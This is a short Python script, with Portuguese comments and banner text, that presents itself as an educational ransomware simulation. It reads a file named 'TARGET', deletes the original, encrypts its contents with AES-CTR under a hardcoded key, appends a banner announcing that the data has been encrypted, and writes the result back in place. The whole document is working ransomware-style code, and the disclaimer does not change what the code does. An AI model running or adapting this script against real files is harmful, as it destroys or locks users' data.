# Ethical Disclaimer: Este código é destinado apenas para fins educacionais.
import os
import pyaes

file_name = "TARGET"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"@@---->>ChavatteSecurity<<----@@"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name

insert_warning = """#!#!#!
    +-----------------------------------------------------------------+
    |                                                                 |
    |                DADOS ENCRIPTADOS COM SUCESSO!!!!                |
    |                                                                 |
    |        Este ataque simulado demonstra a facilidade com que      |  
    |    dados podem ser comprometidos por ransomware.                |
    |        Mesmo em um cenário simplificado,                        |
    |    a ameaça é real e os riscos são elevados.                    |
    |                                                                 |
    |                       Ethical Disclaimer:                       |
    |     Este código é destinado apenas para fins educacionais.      |
    |                                                                 |
    +-----------------------------------------------------------------+
    """

text_bytes = insert_warning.encode('utf-8')

final_data = crypto_data + text_bytes

with open(f'{new_file}','wb') as new_file:
    new_file.write(final_data)
    new_file.close()